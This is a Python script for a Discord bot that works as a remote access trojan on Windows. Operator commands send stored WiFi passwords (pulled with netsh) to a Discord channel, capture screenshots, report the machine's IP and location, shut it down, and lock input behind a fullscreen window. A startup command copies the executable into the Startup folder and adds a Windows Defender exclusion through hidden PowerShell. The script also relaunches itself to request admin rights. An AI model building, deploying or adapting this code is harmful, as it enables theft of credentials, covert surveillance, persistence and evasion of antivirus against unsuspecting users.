
def main():
    import discord
    from discord.ext import commands
    from dotenv import load_dotenv
    import os
    import hashlib
    import requests
    from tkinter import Tk, Label, Entry, Button
    import threading
    import pyautogui
    import subprocess
    import shutil
    import fnmatch
    import psutil
    import asyncio

    # Check if the script is running as a bundle (compiled .exe)
    if getattr(sys, 'frozen', False):
    # Running in a bundle, look for .env in the same directory as the exe
        env_path = os.path.join(sys._MEIPASS, '.env')
    else:
    # Running as a regular Python script, look for .env in the current directory
        env_path = '.env'
    # Load the .env file
    load_dotenv(env_path)

    # Get the token from environment variables
    token = os.getenv("DISCORD_TOKEN")
    # Check if the token is None, indicating that it wasn't loaded correctly
    if not token:
        raise ValueError("No token found. Please check your .env file.")

    # Create an instance of the bot
    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    intents.message_content = True  # This is required for reading messages
    bot = commands.Bot(command_prefix="!", intents=intents)

    # Disable the default help command
    bot.remove_command('help')

    # Tkinter GUI Setup
    root = None
    password_input = None

    def disable_event():
        pass

    def keep_on_top():
        global root
        root.attributes('-topmost', True)
        root.after(1000, keep_on_top)  # Repeat this function every second

    def launch_tkinter():
        global root, password_input
        root = Tk()
        root.title("Fullscreen Window")
        root.attributes('-fullscreen', True)
        root.protocol("WM_DELETE_WINDOW", disable_event)

        # Start the keep_on_top function
        keep_on_top()

        # Start the main loop
        root.mainloop()

    # Function to disable keyboard and mouse
    def disable_input():
        threading.Thread(target=launch_tkinter).start()

    # Function to enable keyboard and mouse
    def enable_input():
        global root
        if root:
            root.destroy() # Close the Tkinter GUI
        else:
            print(f"Error enableing input!")
            
    # Event: Bot is ready
    @bot.event
    async def on_ready():
        print(f"Bot logged in as {bot.user}")
        for guild in bot.guilds:
            print(f"Connected to server: {guild.name}")
            guild = bot.guilds[0]  # Select the first guild the bot is part of
        # Get available channel names
        session_name = "session"
        text_channel_name = get_available_channel_name(guild, session_name)
        # Create a text channel
        text_channel = await guild.create_text_channel(text_channel_name)
        print(f"Session `{text_channel_name}` created.")
        # Send a message to the new text channel
        await text_channel.send(f"Welcome to the new session: `{text_channel_name}`!")

    # Function to get an available channel name
    def get_available_channel_name(guild, base_name):
        suffix = 1
        while True:
            channel_name = f"{base_name}{suffix}"
            if discord.utils.get(guild.channels, name=channel_name) is None:
                return channel_name
            suffix += 1

    # Command: !create_session <session_name>
    @bot.command()
    async def create_session(ctx, session_name: str):
        guild = ctx.guild
        # Get available channel names
        text_channel_name = get_available_channel_name(guild, session_name)
        # Create a text channel
        text_channel = await guild.create_text_channel(text_channel_name)
        await ctx.send(f"Session `{text_channel_name}` created.")
        # Send a message to the new text channel
        await text_channel.send(f"Welcome to the new session: `{text_channel_name}`!")

    # Command: !kill [all|<session_name>]
    @bot.command()
    async def kill(ctx, session_name: str = None):
        guild = ctx.guild
        if session_name == 'all':
            for channel in guild.channels:
                if channel.name.startswith("session"):
                    await channel.delete()
            await ctx.send("All session channels have been deleted.")
        else:
            channel = discord.utils.get(guild.channels, name=session_name)
            if channel:
                await channel.delete()
                await ctx.send(f"Channel `{session_name}` has been deleted.")
            else:
                await ctx.send(f"Channel `{session_name}` not found.")

    # Command: !hello
    @bot.command()
    async def hello(ctx):
        await ctx.send("Hello! I'm your friendly Discord bot.")

    def get_wifi_profiles_and_passwords():
        """Retrieve WiFi profiles and passwords."""
        try:
            # Check for admin privileges
            subprocess.run("net session", shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            return "Please run this script as an administrator."

        try:
            # Get WiFi profiles
            result = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
            profiles = []
            for line in result.splitlines():
                if "All User Profile" in line:
                    profile = line.split(":")[1].strip()
                    profiles.append(profile)
            
            if not profiles:
                return "No WiFi profiles found."

            # Retrieve passwords for each profile
            output = ""
            for profile in profiles:
                try:
                    result = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True)
                    password_line = next((line for line in result.splitlines() if "Key Content" in line), None)
                    password = password_line.split(":")[1].strip() if password_line else "Password not found"
                    output += f"WiFi Network: {profile}\nPassword: {password}\n-----------------------------------\n"
                except subprocess.CalledProcessError:
                    output += f"WiFi Network: {profile}\nPassword: Access denied or profile not found\n-----------------------------------\n"
            return output
        except Exception as e:
            return f"Error retrieving WiFi profiles: {e}"

    @bot.command()
    async def wifi(ctx):
        """Command to retrieve WiFi passwords."""
        await ctx.send("Retrieving WiFi profiles and passwords, please wait...")
        try:
            result = get_wifi_profiles_and_passwords()
            # Ensure the output fits within Discord's message limit
            if len(result) > 2000:
                await ctx.send("The output is too large to send in a single message.")
            else:
                await ctx.send(f"```{result}```")
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")


            
    # Command: !info
    @bot.command()
    async def info(ctx):
        bot_info = """
        **Bot Information:**
        I am a friendly bot created to help you on your server.
        Type `!help` to see all available commands.
        """
        await ctx.send(bot_info)

    # Command: !repeat
    @bot.command()
    async def repeat(ctx, *, message: str):
        await ctx.send(message)

    # Command: !clear (renamed to !kill in previous context)
    @bot.command()
    async def clear(ctx):
        await ctx.send('Clearing all messages...', delete_after=2)
        await ctx.channel.purge()

    # Command: !screenshot
    @bot.command()
    async def screenshot(ctx):
        if is_session_channel(ctx.channel):
            screenshot = pyautogui.screenshot()
            screenshot.save('screenshot.png')
            await ctx.send(file=discord.File('screenshot.png'))
            os.remove('screenshot.png')
        else:
            await ctx.send("This command can only be used in session channels.")

    # Command: !shutdown
    @bot.command()
    async def shutdown(ctx):
        if is_session_channel(ctx.channel):
            await ctx.send('Shutting down the PC...')
            os.system('shutdown /s /t 1')
        else:
            await ctx.send("This command can only be used in session channels.")

    # Command: !ip
    @bot.command()
    async def ip(ctx):
        if is_session_channel(ctx.channel):
            ip_address = get_public_ip()
            await ctx.send(f"The public IP address is: {ip_address}")
        else:
            await ctx.send("This command can only be used in session channels.")

    # Command: !geolocate
    @bot.command()
    async def geolocate(ctx):
        if is_session_channel(ctx.channel):
            ip_address = get_public_ip()
            lat, lon = get_geolocation(ip_address)
            if lat and lon:
                await ctx.send(f"Geolocation for IP {ip_address}: Latitude {lat}, Longitude {lon}")
            else:
                await ctx.send(f"Geolocation information for IP {ip_address} not found.")
        else:
            await ctx.send("This command can only be used in session channels.")

    # Command: !disable
    @bot.command()
    async def disable(ctx):
        if is_session_channel(ctx.channel):
            disable_input()
            await ctx.send("Mouse and keyboard have been disabled.")
        else:
            await ctx.send("This command can only be used in session channels.")

    # Command: !enable
    @bot.command()
    async def enable(ctx):
        if is_session_channel(ctx.channel) or ctx.channel.id == GENERAL_CHANNEL_ID:
            global root
            try:
                if root:
                    await asyncio.to_thread(root.destroy)
                    await ctx.send("Mouse and keyboard have been enabled.")
                      # Close the Tkinter GUI in a non-blocking way
                    
                else:
                    await ctx.send("Error enabling input!")
                    print("Error enabling input: root is None.")
            except Exception as e:
                await ctx.send("An error occurred while enabling input.")
                print(f"Exception occurred: {e}")
        else:
            await ctx.send("This command can only be used in session channels or the general channel.")
            print("Command used in an invalid channel.")

    # Function to get the public IP address
    def get_public_ip():
        response = requests.get("https://api.ipify.org?format=json")
        data = response.json()
        return data["ip"]

    # Function to get geolocation information based on IP address
    def get_geolocation(ip_address):
        response = requests.get(f"http://ipinfo.io/{ip_address}/json")
        data = response.json()
        if 'loc' in data:
            lat, lon = data['loc'].split(',')
            return lat, lon
        else:
            return None, None

    # Custom Help Command
    @bot.command()
    async def help(ctx):
        if is_session_channel(ctx.channel) or ctx.channel.id == GENERAL_CHANNEL_ID:
            help_message = """
            **Available Commands:**

            `!hello` - Greets the user
            `!info`  - Provides information about the bot
            `!repeat <message>` - Repeats your message
            `!clear` - Deletes all messages in the channel
            `!kill all` - Deletes all sessions
            `!kill <session_name>` - Deletes specific session
            `!disable` - Disables the mouse and keyboard
            `!enable` - Enables the mouse and keyboard
            `!screenshot` - Takes a screenshot and sends it
            `!shutdown` - Shuts down the PC
            `!ip` - Displays the public IP address of the machine running the bot
            `!geolocate` - Displays the geolocation (latitude and longitude) of the machine running the bot
            `!startup` - Copies the file of the bot to the startup folder
            `!wifi` - Shows all the wifi passwords
            """
            await ctx.send(help_message)
        else:
            await ctx.send("This command can only be used in the 'general' or 'session' channels.")

    # Utility function to check if the channel is a session channel
    def is_session_channel(channel):
        return channel.name.startswith("session")

    # Set GENERAL_CHANNEL_ID to the ID of your general channel
    GENERAL_CHANNEL_ID = 1313962695585824874  # Replace this with your actual general channel ID

    print("Running...")

    def get_account_name():
        # Run the 'whoami' command
        result = subprocess.run(['whoami'], capture_output=True, text=True)
        full_account_name = result.stdout.strip()
        account_name = full_account_name.split('\\')[-1]
        return account_name

    def find_file(start_dirs, file_pattern):
        """
        Search for a file in the given directories.
        :param start_dirs: List of directories to start the search from.
        :param file_pattern: Pattern of the file name to search for.
        :return: Full path to the file if found, else None.
        """
        for start_dir in start_dirs:
            for root, dirs, files in os.walk(start_dir):
                for name in files:
                    if fnmatch.fnmatch(name, file_pattern):
                        return os.path.join(root, name)
        return None

    def copy_file(source, destination):
        """
        Copy the file to the specified destination.
        :param source: Path to the source file.
        :param destination: Path to the destination directory.
        """
        destination_path = os.path.join(destination, os.path.basename(source))
        if not os.path.exists(destination):
            os.makedirs(destination)
        if os.path.abspath(source) != os.path.abspath(destination_path):
            shutil.copy(source, destination_path)
            print(f"Copied {source} to {destination_path}")
        else:
            print(f"Source and destination are the same: {source}")

    def get_all_drives():
        """
        Get all available drives on the system.
        :return: List of drive letters.
        """
        drives = [disk.device for disk in psutil.disk_partitions()]
        return drives

    #Command: !startup
    @bot.command()
    async def startup(ctx):
        if is_session_channel(ctx.channel) or ctx.channel.id == GENERAL_CHANNEL_ID:
            # Get the account name
            print("Moving files...")
            
            account_name = get_account_name()

            # Get all drives
            all_drives = get_all_drives()

            # Specify the file patterns to search for
            #file_patterns = [".env", "bot5.pyw"]  # Replace with your file names
            file_patterns = ["bot5.exe"]
            # Specify the destination directory
            destination_directory = rf"C:\Users\{account_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"  # Replace with your destination directory

            # Search for and copy each file
            for file_pattern in file_patterns:
                file_path = find_file(all_drives, file_pattern)
                if file_path:
                    copy_file(file_path, destination_directory)
                else:
                    print(f"File {file_pattern} not found.")

            await ctx.send("Files have been copied to startup folder.")
            ps_script = f"Set-MpPreference -ExclusionPath \"{destination_directory}\""
            command = ["powershell", "-WindowStyle", "Hidden", "-Command", ps_script]
    
            # Run the PowerShell command
            subprocess.run(command, check=True)
        else:
            await ctx.send("This command can only be used in session channels.")

    # Run the bot with your token
    bot.run(token)

import os
import sys
import ctypes
import time
def start():
    """Function to initiate the main script execution."""
    try:
        print("Starting script...")
        main()  # Calls the main function
    except Exception as e:
        print(f"Error inside start: {e}")

def run_as_admin():
    """Restart the script with administrative privileges if not already running as admin."""
    try:
        print("Checking if the script is running as admin...")
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        print(f"Is admin: {is_admin}")
    except Exception as e:
        print(f"Error checking admin status: {e}")
        is_admin = False

    if not is_admin:
        # Restart the script with admin privileges
        print("Not running as admin. Attempting to restart with admin privileges.")
        script = sys.executable
        params = " ".join([f'"{arg}"' for arg in sys.argv])
        try:
            print(f"Running script with admin privileges: {script} {params}")
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", script, params, None, 1
            )
            print("Attempt to restart with admin privileges succeeded.")
        except Exception as e:
            print(f"Failed to elevate privileges: {e}")
        sys.exit()  # Exit the current script so the new elevated process runs
    else:
        print("Already running with admin privileges.")
        start()  # If already running as admin, proceed to start()
        print("Started main code")

# Check if the script is running as admin
print("Starting script execution...")
run_as_admin()
